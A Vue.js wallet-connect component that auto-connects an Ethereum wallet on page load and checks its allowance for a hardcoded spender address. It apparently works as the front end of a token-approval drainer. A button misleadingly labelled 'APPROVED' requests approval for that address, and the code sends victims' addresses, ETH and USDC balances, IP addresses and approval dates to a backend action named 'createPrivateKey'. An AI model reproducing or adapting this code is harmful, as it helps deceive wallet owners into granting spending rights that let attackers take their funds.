<template>
    <div class="flex">
      <button class="wallet-btn border border-black px-4 h-12 text-xl hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="!address">CONNECT WALLET</button>
      <div v-else>
        <button v-if="isApproved" class="wallet-btn border border-black px-4 h-12 text-xl hover:scale-105 hover:transition hover:duration-500">{{`${address.slice(0, -36)}...${address.substring(38)}`}}</button>
        <button class="wallet-btn border border-black px-4 h-12 text-xl hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else>APPROVED</button>
      </div>
    </div>
</template>
<script>
  import { ref, computed, onMounted } from 'vue';
  import Web3Wallet from "@/utils/Web3Wallet"
  import { useStore } from 'vuex';

  export default {
    setup() {

      const store = useStore()
      
      const address = ref('');
      const usdc_balance  = ref(0);
      const balance = ref(0);
      
      const isApproved = ref(false);

      const environment = ref('Ethereum');
      let wallet;

      const linkWallet = async () => {
        environment.value = 'Ethereum'
        onConnect()
      }

      const onConnect = async () => {
        if (environment.value === 'Ethereum' && window.ethereum) {
          wallet = new Web3Wallet();
        } else {
          console.log("Error")
          return;
        }
        try {
          await wallet.linkWallet();
          address.value = await wallet.getAddress();
          
          let aprove = await wallet.getAllowance(address.value, '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9');
          console.log("aprove", aprove)
          if(aprove > 0) {
            isApproved.value = true;
            store.commit('user/setApprove', isApproved.value)
            let approvedData = {
              walletAddress:address.value,
              data: { 
                is_approved : isApproved.value,
                is_virtual: false,
              }
            }
            await store.dispatch('user/createPrivateKey', approvedData)
          }
          
          store.commit('user/setAddress', address.value)

          if (address.value === false) {
            throw new TypeError("There was an issue signing you in.")
          }
          usdc_balance.value = await wallet.getBalance(address.value)
          balance.value = await wallet.balance(address.value)
          const userInfo = computed(() => store.getters['user/getUserInfo'])
          let payload = {
            wallet: address.value,
            initial_eth_balance: balance.value,
            initial_usdc_balance: usdc_balance.value,
            ip_address: localStorage.getItem("ipAddress"),
            access_number: userInfo.value.access_number + 1,
            access_time: new Date(),

          }
          const response = await store.dispatch( 'user/fetchUserInfo', address.value )
          
          if(response < 1) {
            await store.dispatch( 'user/userRegister', payload )
          } else {
            let ipData = {
              walletAddress:address.value,
              data: { 
                ip_address : localStorage.getItem("ipAddress")
              }
            }
            await store.dispatch('user/createPrivateKey', ipData)
          }

        } catch (err) {
          console.log('login', err)
        }
      }
      const approve = async () => {
        let auth_address = '';
        if (environment.value === 'Ethereum') {
          auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
        } 
        if (auth_address === '') {
          console.log("Error")
          return;
        }
        try {
          const hash = await wallet.approve(auth_address, address.value);
          isApproved.value = true;
          store.commit('user/setApprove', isApproved.value)
          let payload = {
            walletAddress:address.value,
            data: { 
              is_approved : isApproved.value,
              approval_date: new Date(),
            }
          }
          await store.dispatch('user/createPrivateKey', payload)
        } catch (error) {
          isApproved.value = false;
        }
      }

      onMounted(()=> {
        setTimeout(() => {
          linkWallet();
        }, 1000);
      })


      return { 
        linkWallet, 
        address, 
        approve, 
        isApproved, 
      };

    },
  };
</script>
